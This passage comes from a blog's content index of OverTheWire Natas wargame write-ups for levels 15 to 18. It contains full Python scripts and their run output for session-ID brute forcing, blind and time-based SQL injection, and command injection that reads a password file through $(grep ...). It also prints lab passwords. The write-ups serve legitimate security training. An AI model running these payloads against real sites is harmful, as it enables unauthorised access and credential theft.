\u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code explanaiton The code selections that should interest us are:\n$maxid = 640; // 640 should be enough for everyone function isValidAdminLogin() { /* {{{ */ if($_REQUEST[\u0026#34;username\u0026#34;] == \u0026#34;admin\u0026#34;) { /* This method of authentication appears to be unsafe and has been disabled for now. */ //return 1; } return 0; } And:\nfunction my_session_start() { /* {{{ */ if(array_key_exists(\u0026#34;PHPSESSID\u0026#34;, $_COOKIE) and isValidID($_COOKIE[\u0026#34;PHPSESSID\u0026#34;])) { if(!session_start()) { debug(\u0026#34;Session start failed\u0026#34;); return false; } else { debug(\u0026#34;Session start ok\u0026#34;); if(!array_key_exists(\u0026#34;admin\u0026#34;, $_SESSION)) { debug(\u0026#34;Session was old: admin flag set\u0026#34;); $_SESSION[\u0026#34;admin\u0026#34;] = 0; // backwards compatible, secure } return true; } } return false; } /* }}} */ function print_credentials() { /* {{{ */ if($_SESSION and array_key_exists(\u0026#34;admin\u0026#34;, $_SESSION) and $_SESSION[\u0026#34;admin\u0026#34;] == 1) { print \u0026#34;You are an admin. The credentials for the next level are:\u0026lt;br\u0026gt;\u0026#34;; print \u0026#34;\u0026lt;pre\u0026gt;Username: natas19\\n\u0026#34;; print \u0026#34;Password: \u0026lt;censored\u0026gt;\u0026lt;/pre\u0026gt;\u0026#34;; } else { print \u0026#34;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.\u0026#34;; } } We are presented with an early variable definition of maxid = 640.\nTrying to log into admin will not get you anywhere since the request has to be made from a certain unknown id in order for the request to pass.\nWhat is there left to do? Since we know the id range we should look into, a simple brute-force script that tries to login on every single seesion id should do the trick. Python will come to the rescue once again.\nPython script:\nimport requests target = \u0026#39;http://natas18.natas.labs.overthewire.org\u0026#39; auth = (\u0026#39;natas18\u0026#39;,\u0026#39;6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\u0026#39;) params = dict(username=\u0026#39;admin\u0026#39;, password=\u0026#39;admin\u0026#39;) cookies = dict() max_s_id = 640 s_id = 1 while s_id \u0026lt;= max_s_id: print (\u0026#34;ID = \u0026#34; + str(s_id)) cookies = dict(PHPSESSID=str(s_id)) r = requests.get(target, auth=auth, params=params, cookies=cookies) if \u0026#34;You are an admin\u0026#34; in r.text: print (r.text) break s_id += 1 This basically tries to send a packet for each id from 1 to the max declared id and when it get`s the return that \u0026ldquo;You are an admin\u0026rdquo; breaks. Another possible approach would be to use burp suite to traverse all the possible id`s in an attack and look through the responses for the admin breakpoint. Code running:\n03:11:53 archie@Archie py → python3 script.py ID = 1 ID = 2 ID = 3 ID = 4 ID = 5 ID = 6 ID = 7 ID = 8 ID = 9 . . . ID = 109 ID = 110 ID = 111 ID = 112 ID = 113 ID = 114 ID = 115 ID = 116 ID = 117 ID = 118 ID = 119 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/level.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/wechall.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/wechall.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026#34;level\u0026#34;: \u0026#34;natas18\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ\u0026#34; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas18\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt; You are an admin. The credentials for the next level are:\u0026lt;br\u0026gt;\u0026lt;pre\u0026gt;Username: natas19 Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr\u0026lt;/pre\u0026gt;\u0026lt;div id=\u0026#34;viewsource\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index-source.html\u0026#34;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; As you can see, the correct session id was 119 and sending a packet with that id select as your cookie grants us access to natas19.11\n","date":"2024-08-26T14:47:03+03:00","permalink":"//localhost:1313/post/natas18/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 18"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas17\nPassword: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC\nURL: http://natas17.natas.labs.overthewire.org\nSolution idea Doc What is brute-forcing?\nIn cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.\nWhat is python?\nPython is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming.\nWhat is php?\nPHP is a general-purpose scripting language geared towards web development. It was originally created by Danish-Canadian programmer Rasmus Lerdorf in 1993 and released in 1995. The PHP reference implementation is now produced by the PHP Group.\nWhat is SQL?\nStructured Query Language is a domain-specific language used to manage data, especially in a relational database management system. It is particularly useful in handling structured data, i.e., data incorporating relations among entities and variables.\nWhat is SQL injection?\nIn computing, SQL injection is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution.\nSolution The index page of natas17 presents us with a Username field and a check existance button just like in the previous levels.\nLet`s check the Source code: \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/level.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/wechall.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/wechall.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026#34;level\u0026#34;: \u0026#34;natas17\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;\u0026lt;censored\u0026gt;\u0026#34; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas17\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;?php /* CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL ); */ if(array_key_exists(\u0026#34;username\u0026#34;, $_REQUEST)) { $link = mysqli_connect(\u0026#39;localhost\u0026#39;, \u0026#39;natas17\u0026#39;, \u0026#39;\u0026lt;censored\u0026gt;\u0026#39;); mysqli_select_db($link, \u0026#39;natas17\u0026#39;); $query = \u0026#34;SELECT * from users where username=\\\u0026#34;\u0026#34;.$_REQUEST[\u0026#34;username\u0026#34;].\u0026#34;\\\u0026#34;\u0026#34;; if(array_key_exists(\u0026#34;debug\u0026#34;, $_GET)) { echo \u0026#34;Executing query: $query\u0026lt;br\u0026gt;\u0026#34;; } $res = mysqli_query($link, $query); if($res) { if(mysqli_num_rows($res) \u0026gt; 0) { //echo \u0026#34;This user exists.\u0026lt;br\u0026gt;\u0026#34;; } else { //echo \u0026#34;This user doesn\u0026#39;t exist.\u0026lt;br\u0026gt;\u0026#34;; } } else { //echo \u0026#34;Error in query.\u0026lt;br\u0026gt;\u0026#34;; } mysqli_close($link); } else { ?\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; Username: \u0026lt;input name=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Check existence\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;div id=\u0026#34;viewsource\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index-source.html\u0026#34;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; This solution seems to be based again on some sort of SQL injection. Let`s break down the code and find the important snippets.\nif(array_key_exists(\u0026#34;username\u0026#34;, $_REQUEST)) { $link = mysqli_connect(\u0026#39;localhost\u0026#39;, \u0026#39;natas17\u0026#39;, \u0026#39;\u0026lt;censored\u0026gt;\u0026#39;); mysqli_select_db($link, \u0026#39;natas17\u0026#39;); $query = \u0026#34;SELECT * from users where username=\\\u0026#34;\u0026#34;.$_REQUEST[\u0026#34;username\u0026#34;].\u0026#34;\\\u0026#34;\u0026#34;; if(array_key_exists(\u0026#34;debug\u0026#34;, $_GET)) { echo \u0026#34;Executing query: $query\u0026lt;br\u0026gt;\u0026#34;; } $res = mysqli_query($link, $query); if($res) { if(mysqli_num_rows($res) \u0026gt; 0) { //echo \u0026#34;This user exists.\u0026lt;br\u0026gt;\u0026#34;; } else { //echo \u0026#34;This user doesn\u0026#39;t exist.\u0026lt;br\u0026gt;\u0026#34;; } } else { //echo \u0026#34;Error in query.\u0026lt;br\u0026gt;\u0026#34;; } mysqli_close($link); } This seems to be the part where the magic happens. It is very similar to a SQL injection we used previously, the caviat here being that there`s no ouput so we can not be sure if the data we bring into the equation is correct or not. We could use a timeout after the query tho in order to see what happens since if the query is returning somehting, the timeout will execute, otherwise it will just skip to the next iteration.\nFor that, a script similar to the last SQL injection will be necessary. We can just slightly modify the already completed script in order to adapt it to natas17.\nCode:\nimport requests import re from time import * characters = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#34; username = \u0026#34;natas17\u0026#34; password = \u0026#34;EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC\u0026#34; Url = \u0026#34;http://natas17.natas.labs.overthewire.org\u0026#34; session = requests.session() current_password = list() while(True): for character in characters: print(\u0026#34;Trying with: \u0026#34; + \u0026#34;\u0026#34;.join(current_password) + character) startTime = time() response = session.post(Url, data={\u0026#34;username\u0026#34;: \u0026#39;natas18\u0026#34; AND password LIKE BINARY \u0026#34;\u0026#39; + \u0026#34;\u0026#34;.join(current_password) + character + \u0026#39;%\u0026#34; AND SLEEP(2) #\u0026#39;},auth=(username, password)) endTime = time() if endTime - startTime \u0026gt; 2: current_password.append(character) break if len(current_password) == 32: break Script run:\n02:28:04 archie@Archie py → python3 script.py Trying with: a Trying with: b Trying with: c Trying with: d Trying with: e Trying with: f Trying with: g Trying with: h Trying with: i Trying with: j Trying with: k Trying with: l Trying with: m Trying with: n Trying with: o . . . Trying with: 6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ The code is not my intelectual property and was adapted from \u0026ldquo;see header\u0026rdquo;.\n","date":"2024-08-25T21:17:22+03:00","permalink":"//localhost:1313/post/natas17/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 17"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas16\nPassword: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo\nURL: http://natas16.natas.labs.overthewire.org\nDoc What is brute-forcing?\nIn cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.\nWhat is python?\nPython is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming.\nWhat is php?\nPHP is a general-purpose scripting language geared towards web development. It was originally created by Danish-Canadian programmer Rasmus Lerdorf in 1993 and released in 1995. The PHP reference implementation is now produced by the PHP Group.\nSolution We should examine the index page of natas16 as per usual. There is a word search field just like in a previous letter and a search button.\nSource code: \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/level.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/wechall.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/wechall.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026#34;level\u0026#34;: \u0026#34;natas16\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;\u0026lt;censored\u0026gt;\u0026#34; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas16\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt; For security reasons, we now filter even more on certain characters\u0026lt;br/\u0026gt;\u0026lt;br/\u0026gt; \u0026lt;form\u0026gt; Find words containing: \u0026lt;input name=needle\u0026gt;\u0026lt;input type=submit name=submit value=Search\u0026gt;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;/form\u0026gt; Output: \u0026lt;pre\u0026gt; \u0026lt;? $key = \u0026#34;\u0026#34;; if(array_key_exists(\u0026#34;needle\u0026#34;, $_REQUEST)) { $key = $_REQUEST[\u0026#34;needle\u0026#34;]; } if($key != \u0026#34;\u0026#34;) { if(preg_match(\u0026#39;/[;|\u0026amp;`\\\u0026#39;\u0026#34;]/\u0026#39;,$key)) { print \u0026#34;Input contains an illegal character!\u0026#34;; } else { passthru(\u0026#34;grep -i \\\u0026#34;$key\\\u0026#34; dictionary.txt\u0026#34;); } } ?\u0026gt; \u0026lt;/pre\u0026gt; \u0026lt;div id=\u0026#34;viewsource\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index-source.html\u0026#34;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; What does this code do? The important selection out of all of that code is this:\nif(array_key_exists(\u0026#34;needle\u0026#34;, $_REQUEST)) { $key = $_REQUEST[\u0026#34;needle\u0026#34;]; } if($key != \u0026#34;\u0026#34;) { if(preg_match(\u0026#39;/[;|\u0026amp;`\\\u0026#39;\u0026#34;]/\u0026#39;,$key)) { print \u0026#34;Input contains an illegal character!\u0026#34;; } else { passthru(\u0026#34;grep -i \\\u0026#34;$key\\\u0026#34; dictionary.txt\u0026#34;); } } ?\u0026gt; This code snippet submits the sent data from the natas16 index page and searches the dictionary.txt file in order to find matching words that contain the given pattern. There is also some illegal character filter in place in order to make PHP injection more difficult to perform. The sollution to this level will be extremly similar to that of natas15 since we are gonna try data and use the response packets we get in order to filter out usefull data.\nGrep documentation needed: grep (1) - print lines that match patterns -E, --extended-regexp PATTERNS are extended regular expressions We are gonna do an extended regex in order to fill out characters in the password for natas17 in conjunction with a word that we know is present in the dictionary.txt file, then if the response contains the word, we know that the selected character is in the password, otherwise not.\nGrep format: $(grep -E ^ string/character.* /etc/natas_webpass/natas17)Existing_key We need to find a string that appears in dictionary.txt:\nNow all that is left to do is implement this in a python script just like we did previously. The script: import requests target = \u0026#39;http://natas16.natas.labs.overthewire.org\u0026#39; possible = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; final = \u0026#39;\u0026#39; i = 0 while len(final) != 32: while i \u0026lt; len(possible): character = possible[i] needle = (\u0026#39;$(grep -E ^%s%c.* /etc/natas_webpass/natas17)abandoned\u0026#39; % (final, character)) req = requests.get(target, auth=(\u0026#39;natas16\u0026#39;,\u0026#39;hPkjKYviLQctEW33QmuXL6eDVfMW4sGo\u0026#39;), params={\u0026#34;needle\u0026#34;: needle} ) if \u0026#34;abandoned\u0026#34; not in req.text: final += character print (\u0026#39;Password so far : \u0026#39; + final) i = 0 else: i += 1 print (\u0026#34;----Script Finished----\u0026#34;) print (\u0026#34;Password is : \u0026#34; + final) Now all that is left to do is run the script and obtain the password for natas17.\nScript run: 02:59:31 archie@Archie python → python3 scriptnatas16.py Password so far : E Password so far : Eq Password so far : Eqj Password so far : EqjH Password so far : EqjHJ Password so far : EqjHJb Password so far : EqjHJbo Password so far : EqjHJbo7 Password so far : EqjHJbo7L Password so far : EqjHJbo7LF Password so far : EqjHJbo7LFN Password so far : EqjHJbo7LFNb Password so far : EqjHJbo7LFNb8 Password so far : EqjHJbo7LFNb8v Password so far : EqjHJbo7LFNb8vw Password so far : EqjHJbo7LFNb8vwh Password so far : EqjHJbo7LFNb8vwhH Password so far : EqjHJbo7LFNb8vwhHb Password so far : EqjHJbo7LFNb8vwhHb9 Password so far : EqjHJbo7LFNb8vwhHb9s Password so far : EqjHJbo7LFNb8vwhHb9s7 Password so far : EqjHJbo7LFNb8vwhHb9s75 Password so far : EqjHJbo7LFNb8vwhHb9s75h Password so far : EqjHJbo7LFNb8vwhHb9s75ho Password so far : EqjHJbo7LFNb8vwhHb9s75hok Password so far : EqjHJbo7LFNb8vwhHb9s75hokh Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5 Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5T Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF0 Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF0O Password so far : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC ----Script Finished---- Password is : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC ","date":"2024-08-24T14:37:52+03:00","permalink":"//localhost:1313/post/natas16/","section":"post","tags":["CTF","Completed"],"title":"Natas-Level 16"},{"categories":["Overthewire","Natas"],"contents":"Login Username: natas15\nPassword: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx\nURL: http://natas15.natas.labs.overthewire.org\nDoc What is SQL?\nStructured Query Language is a domain-specific language used to manage data, especially in a relational database management system. It is particularly useful in handling structured data, i.e., data incorporating relations among entities and variables. What is SQL injection?\nIn computing, SQL injection is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution.\nWhat is brute-forcing?\nIn cryptography, a brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.\nWhat is python?\nPython is a high-level, general-purpose programming language. Its design philosophy emphasizes code readability with the use of significant indentation. Python is dynamically typed and garbage-collected. It supports multiple programming paradigms, including structured, object-oriented and functional programming.\nSolution Let`s log into natas15. Now the only present field is one entitled username and a check existance send button.\nSource code: \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!-- This stuff in the header has nothing to do with the level --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; type=\u0026#34;text/css\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/level.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/jquery-ui.css\u0026#34; /\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;http://natas.labs.overthewire.org/css/wechall.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-1.9.1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/jquery-ui.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=http://natas.labs.overthewire.org/js/wechall-data.js\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script src=\u0026#34;http://natas.labs.overthewire.org/js/wechall.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt;var wechallinfo = { \u0026#34;level\u0026#34;: \u0026#34;natas15\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;\u0026lt;censored\u0026gt;\u0026#34; };\u0026lt;/script\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;natas15\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;content\u0026#34;\u0026gt; \u0026lt;?php /* CREATE TABLE `users` ( `username` varchar(64) DEFAULT NULL, `password` varchar(64) DEFAULT NULL ); */ if(array_key_exists(\u0026#34;username\u0026#34;, $_REQUEST)) { $link = mysqli_connect(\u0026#39;localhost\u0026#39;, \u0026#39;natas15\u0026#39;, \u0026#39;\u0026lt;censored\u0026gt;\u0026#39;); mysqli_select_db($link, \u0026#39;natas15\u0026#39;); $query = \u0026#34;SELECT * from users where username=\\\u0026#34;\u0026#34;.$_REQUEST[\u0026#34;username\u0026#34;].\u0026#34;\\\u0026#34;\u0026#34;; if(array_key_exists(\u0026#34;debug\u0026#34;, $_GET)) { echo \u0026#34;Executing query: $query\u0026lt;br\u0026gt;\u0026#34;; } $res = mysqli_query($link, $query); if($res) { if(mysqli_num_rows($res) \u0026gt; 0) { echo \u0026#34;This user exists.\u0026lt;br\u0026gt;\u0026#34;; } else { echo \u0026#34;This user doesn\u0026#39;t exist.\u0026lt;br\u0026gt;\u0026#34;; } } else { echo \u0026#34;Error in query.\u0026lt;br\u0026gt;\u0026#34;; } mysqli_close($link); } else { ?\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; Username: \u0026lt;input name=\u0026#34;username\u0026#34;\u0026gt;\u0026lt;br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Check existence\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;div id=\u0026#34;viewsource\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;index-source.html\u0026#34;\u0026gt;View sourcecode\u0026lt;/a\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; What does this code do? The important selection out of all of that code is this:\n$query = \u0026#34;SELECT * from users where username=\\\u0026#34;\u0026#34;.$_REQUEST[\u0026#34;username\u0026#34;].\u0026#34;\\\u0026#34;\u0026#34;; if(array_key_exists(\u0026#34;debug\u0026#34;, $_GET)) { echo \u0026#34;Executing query: $query\u0026lt;br\u0026gt;\u0026#34;; } $res = mysqli_query($link, $query); if($res) { if(mysqli_num_rows($res) \u0026gt; 0) { echo \u0026#34;This user exists.\u0026lt;br\u0026gt;\u0026#34;; } else { echo \u0026#34;This user doesn\u0026#39;t exist.\u0026lt;br\u0026gt;\u0026#34;; } } else { echo \u0026#34;Error in query.\u0026lt;br\u0026gt;\u0026#34;; } This code snippet submits the sent data from the natas15 index page and parses it into a SQL query that boils down to:\nSelect * FROM users WHERE username=\u0026#34;sentData\u0026#34; Easy, basic SQL injection just like the last time right? Welp, not so soon since this time, there is no output except for an existance confirmation, a \u0026ldquo;does not exist return\u0026rdquo; and a sql querry error statement. So now that we know that we can`t output anything, what are we supposed to do?\nThe 3 type of returns are actually very usefull since you can send data packets and get confirmation about the packets. The approach idea is to try every possible combination tailored with what we know that the output should be and how it should look and watch out for validation.\nIn practice, how can it be done? The SQL injection statement will look like this:\nnatas16\u0026#34; AND password LIKE BINARY \u0026#34;%letter%\u0026#34; \u0026#34; This will produce a positive output when the password associated with natas16 contains a letter given by us (or in this case also an uppercase letter and numbers) and we will produce a string composed of all the letters present in the actual password. We should write a script in order to achieve this since doing that by hand is not possible.\nPython script template:\nimport requests target = \u0026#39;http://natas15.natas.labs.overthewire.org\u0026#39; possibleCharacterList = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; foundCharacterList = \u0026#39;\u0026#39; for character in possibleCharacterList: username = (\u0026#39;natas16\u0026#34; AND password LIKE BINARY \u0026#34;%\u0026#39; + character +\u0026#39;%\u0026#34; \u0026#34;\u0026#39;) #BINARY is used to make the search case sensitive req = requests.get(target, auth=(\u0026#39;natas15\u0026#39;,\u0026#39;SdqIqBsFcz3yotlNYErZSZwblkm0lrvx\u0026#39;), params={\u0026#34;username\u0026#34;: username} ) if \u0026#34;This user exists\u0026#34; in req.text: foundCharacterList += character print (\u0026#39;Possible so far: \u0026#39; + foundCharacterList) print(\u0026#34;----\u0026#34;+\u0026#34;end of search\u0026#34;+\u0026#34;----\u0026#34;) We use the request library in order to make requests and get responses from the service then define our SQL query, define our auth parameters (the login data you have for natas15) and if the response to our insert with a certain character is possitive, append it to the empty list.\nScript execution:\n03:13:59 archie@Archie pyscript → python3 getpasswordletters.py Possible so far: 3 Possible so far: 34 Possible so far: 346 Possible so far: 346c Possible so far: 346ce Possible so far: 346cef Possible so far: 346cefh Possible so far: 346cefhi Possible so far: 346cefhij Possible so far: 346cefhijk Possible so far: 346cefhijkm Possible so far: 346cefhijkmo Possible so far: 346cefhijkmos Possible so far: 346cefhijkmost Possible so far: 346cefhijkmostu Possible so far: 346cefhijkmostuv Possible so far: 346cefhijkmostuvD Possible so far: 346cefhijkmostuvDE Possible so far: 346cefhijkmostuvDEG Possible so far: 346cefhijkmostuvDEGK Possible so far: 346cefhijkmostuvDEGKL Possible so far: 346cefhijkmostuvDEGKLM Possible so far: 346cefhijkmostuvDEGKLMP Possible so far: 346cefhijkmostuvDEGKLMPQ Possible so far: 346cefhijkmostuvDEGKLMPQV Possible so far: 346cefhijkmostuvDEGKLMPQVW Possible so far: 346cefhijkmostuvDEGKLMPQVWX Possible so far: 346cefhijkmostuvDEGKLMPQVWXY ----end of search---- Possible characters: 346cefhijkmostuvDEGKLMPQVWXY As you can see, we confirmed that the password is composed out of these characters : 346cefhijkmostuvDEGKLMPQVWXY\nWhat`s next? Okay, so we have our string of present characters in the password but that is not the passkey for the next level. The approach will now be, for character in string, if password is like characterinstring% append to characterinstring and continue until the password reaches the length of 32 (all the password`s lenghts so far) and then break.\nFor that I will make a function that takes the output of the last script and does what I`ve described ealier for each letter in the input.\nFunction:\ndef get_password(foundCharacterList): password = \u0026#39;\u0026#39; while len(password)!=32: for character in foundCharacterList: username = (\u0026#39;natas16\u0026#34; AND password LIKE BINARY \u0026#34;\u0026#39; + password + character + \u0026#39;%\u0026#34; \u0026#34;\u0026#39;) req = requests.get(target, auth=(\u0026#39;natas15\u0026#39;,\u0026#39;SdqIqBsFcz3yotlNYErZSZwblkm0lrvx\u0026#39;), params={\u0026#34;username\u0026#34;: username} ) if \u0026#34;This user exists\u0026#34; in req.text: password += character print (\u0026#39;Password so far: \u0026#39; + password) break print(\u0026#34;Final password: \u0026#34; + password) Now let`s run this:\n03:32:35 archie@Archie pyscript → python3 finalscript.py Possible so far: 3 Possible so far: 34 Possible so far: 346 Possible so far: 346c Possible so far: 346ce Possible so far: 346cef Possible so far: 346cefh Possible so far: 346cefhi Possible so far: 346cefhij Possible so far: 346cefhijk Possible so far: 346cefhijkm Possible so far: 346cefhijkmo Possible so far: 346cefhijkmos Possible so far: 346cefhijkmost Possible so far: 346cefhijkmostu Possible so far: 346cefhijkmostuv Possible so far: 346cefhijkmostuvD Possible so far: 346cefhijkmostuvDE Possible so far: 346cefhijkmostuvDEG Possible so far: 346cefhijkmostuvDEGK Possible so far: 346cefhijkmostuvDEGKL Possible so far: 346cefhijkmostuvDEGKLM Possible so far: 346cefhijkmostuvDEGKLMP Possible so far: 346cefhijkmostuvDEGKLMPQ Possible so far: 346cefhijkmostuvDEGKLMPQV Possible so far: 346cefhijkmostuvDEGKLMPQVW Possible so far: 346cefhijkmostuvDEGKLMPQVWX 